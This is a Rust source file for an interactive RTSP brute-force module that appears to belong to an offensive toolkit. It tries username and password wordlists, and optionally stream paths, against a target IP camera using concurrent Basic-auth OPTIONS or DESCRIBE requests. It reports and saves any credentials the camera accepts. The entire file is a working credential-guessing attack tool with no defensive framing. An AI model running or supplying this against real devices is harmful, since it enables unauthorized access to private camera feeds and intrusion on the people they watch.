use anyhow::{anyhow, Result};
use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as Base64;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    net::SocketAddr,
    path::{Path, PathBuf},
    sync::Arc,
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::Mutex,
    time::{sleep, Duration},
};

/// Main entry point for the advanced RTSP brute force module.
pub async fn run(target: &str) -> Result<()> {
    println!("=== Advanced RTSP Brute Force Module ===");
    println!("[*] Target: {}", target);

    //------------------------------
    // 1) Basic Brute Force Settings
    //------------------------------
    let port: u16 = loop {
        let input = prompt_default("RTSP Port", "554")?;
        match input.parse() {
            Ok(p) => break p,
            Err(_) => println!("Invalid port. Try again."),
        }
    };

    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.parse() {
            Ok(n) if n > 0 => break n,
            _ => println!("Invalid number. Try again."),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "rtsp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;

    //------------------------------
    // 2) Advanced Features
    //------------------------------
    let advanced_mode = prompt_yes_no("Use advanced RTSP commands/headers (DESCRIBE + custom headers)?", false)?;
    let mut advanced_headers: Vec<String> = Vec::new();
    let advanced_command = if advanced_mode {
        // By default, we'll demonstrate a DESCRIBE method.
        // You could prompt for multiple commands, but here's one for simplicity.
        let method = prompt_default("RTSP method to use (e.g. DESCRIBE)", "DESCRIBE")?;
        // Prompt for custom headers file
        let headers_file = prompt_yes_no("Load extra RTSP headers from a file?", false)?;
        if headers_file {
            let headers_path = prompt_required("Path to RTSP headers file")?;
            advanced_headers = load_lines(&headers_path)?;
        }
        Some(method)
    } else {
        None
    };

    //------------------------------
    // 3) Brute Force RTSP Paths
    //------------------------------
    let brute_force_paths = prompt_yes_no("Brute force possible RTSP paths (e.g. /stream /live)?", false)?;
    let paths = if brute_force_paths {
        let paths_file = prompt_required("Path to RTSP paths file")?;
        load_lines(&paths_file)?
    } else {
        // If not brute forcing paths, we just do an empty vector or single slash
        vec!["".to_string()]  // We'll interpret "" as no path specified
    };

    //------------------------------
    // 4) Begin Brute Force
    //------------------------------
    let addr = format!("{}:{}", target, port);
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(Mutex::new(false));

    println!("\n[*] Starting brute-force on {}", addr);

    // Load user list
    let users = load_lines(&usernames_file)?;

    // Load password list
    let pass_file = File::open(&passwords_file)?;
    let pass_buf = BufReader::new(pass_file);
    let pass_lines: Vec<_> = pass_buf.lines().filter_map(Result::ok).collect();

    let mut idx = 0;
    // For each password
    for pass in pass_lines {
        // If we've already found valid creds and we're stopping on success, break early
        if *stop.lock().await {
            break;
        }

        // If combo_mode is true, each password tries all users.
        // Otherwise, line up each user with the “idx” (like a parallel dictionary).
        let userlist = if combo_mode {
            users.clone()
        } else {
            // Use user at "idx % users.len()" if we’re not in combo_mode
            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
        };

        // We batch tasks up to "concurrency"
        let mut handles = vec![];

        // For each username
        for user in userlist {
            // For each path
            for path in &paths {
                if *stop.lock().await {
                    break;
                }

                // Clone references for the task
                let addr = addr.clone();
                let user = user.clone();
                let pass = pass.clone();
                let path = path.clone();
                let found = Arc::clone(&found);
                let stop = Arc::clone(&stop);

                // The advanced method & headers
                let command = advanced_command.clone();
                let headers = advanced_headers.clone();

                let handle = tokio::spawn(async move {
                    // Check again if we've been signaled to stop
                    if *stop.lock().await {
                        return;
                    }

                    match try_rtsp_login(&addr, &user, &pass, &path, command.as_deref(), &headers).await {
                        Ok(true) => {
                            let path_str = if path.is_empty() { "NO_PATH" } else { &path };
                            println!("[+] {} -> {}:{} [path={}]",
                                addr, user, pass, path_str);
                            found.lock().await.push((addr.clone(), user.clone(), pass.clone(), path_str.to_string()));

                            if stop_on_success {
                                *stop.lock().await = true;
                            }
                        }
                        Ok(false) => {
                            log(verbose, &format!("[-] {} -> {}:{} [path={}]", addr, user, pass, path));
                        }
                        Err(e) => {
                            log(verbose, &format!("[!] {} -> error: {}", addr, e));
                        }
                    }

                    // A short delay between attempts
                    sleep(Duration::from_millis(10)).await;
                });

                handles.push(handle);

                // If we reach concurrency, wait for them to finish before scheduling more
                if handles.len() >= concurrency {
                    for h in handles.drain(..) {
                        let _ = h.await;
                    }
                }
            }
        }

        // Wait for any leftover tasks in the batch
        for h in handles {
            let _ = h.await;
        }

        idx += 1;
    }

    //------------------------------
    // 5) Show Results / Save
    //------------------------------
    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found (with these paths).");
    } else {
        println!("\n[+] Valid credentials (and paths):");
        for (host, user, pass, path) in creds.iter() {
            println!("    {} -> {}:{} [path={}]", host, user, pass, path);
        }

        if let Some(path) = save_path {
            let filename = get_filename_in_current_dir(&path);
            let mut file = File::create(&filename)?;
            for (host, user, pass, path) in creds.iter() {
                writeln!(file, "{} -> {}:{} [path={}]", host, user, pass, path)?;
            }
            println!("[+] Results saved to '{}'", filename.display());
        }
    }

    Ok(())
}

/// Attempt to authenticate via RTSP (with optional advanced method + headers).
/// Returns Ok(true) if successful, Ok(false) if incorrect credentials, Err(...) if we can’t connect/parse response.
async fn try_rtsp_login(
    addr: &str,
    user: &str,
    pass: &str,
    path: &str,
    method: Option<&str>,
    extra_headers: &[String],
) -> Result<bool> {
    // Parse the address to confirm it's valid
    let socket_addr: SocketAddr = addr.parse()
        .map_err(|e| anyhow!("Invalid socket address '{}': {}", addr, e))?;

    // Open TCP connection to camera
    let mut stream = TcpStream::connect(socket_addr)
        .await
        .map_err(|e| anyhow!("Connection error: {}", e))?;

    // If the user wants advanced mode, use "method" (e.g., DESCRIBE) + headers.
    // Otherwise, fallback to OPTIONS. We'll do "DESCRIBE" by default if method is Some("DESCRIBE").
    let rtsp_method = method.unwrap_or("OPTIONS");

    // Build path portion (some cameras expect the path in the request line).
    // If path is empty, we skip it. Or default to / if you want.
    let path_str = if path.is_empty() {
        ""  // or "/"
    } else {
        path
    };

    // Build Basic Auth
    let credentials = Base64.encode(format!("{}:{}", user, pass));

    // Build the RTSP request line
    let mut request = format!(
        "{method} rtsp://{addr}/{path} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n",
        method = rtsp_method,
        addr = addr,
        path = path_str.trim_start_matches('/'), // avoid double slash
        auth = credentials,
    );

    // Append extra headers if advanced mode is on
    for header in extra_headers {
        // We assume each line in extra_headers is valid, e.g. "User-Agent: MyCameraClient"
        request.push_str(header);
        if !header.ends_with("\r\n") {
            request.push_str("\r\n");
        }
    }

    // End with a blank line
    request.push_str("\r\n");

    // Send request
    stream.write_all(request.as_bytes()).await?;

    // Read response
    let mut buffer = [0u8; 2048];
    let n = stream.read(&mut buffer).await?;
    if n == 0 {
        return Err(anyhow!("Server closed connection unexpectedly."));
    }
    let response = String::from_utf8_lossy(&buffer[..n]);

    // Very naive checks
    if response.contains("200 OK") {
        Ok(true)
    } else if response.contains("401") || response.contains("403") {
        Ok(false)
    } else {
        Err(anyhow!("Unexpected RTSP response:\n{}", response))
    }
}

/// Prompts the user for a required field (no default allowed).
fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}: ", msg);
        std::io::Write::flush(&mut std::io::stdout())?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("This field is required.");
        }
    }
}

/// Prompts the user for a value with a default fallback.
fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", msg, default);
    std::io::Write::flush(&mut std::io::stdout())?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

/// Prompts the user for a yes/no question, with a default answer.
fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default = if default_yes { "y" } else { "n" };
    loop {
        print!("{} (y/n) [{}]: ", msg, default);
        std::io::Write::flush(&mut std::io::stdout())?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("Invalid input. Please enter 'y' or 'n'.");
        }
    }
}

/// Loads a file, returning non-empty lines in a Vec.
fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect())
}

/// Prints log messages only in verbose mode.
fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

/// Returns a PathBuf in the current directory for the given filename.
fn get_filename_in_current_dir(input: &str) -> PathBuf {
    let name = Path::new(input)
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    PathBuf::from(format!("./{}", name))
}
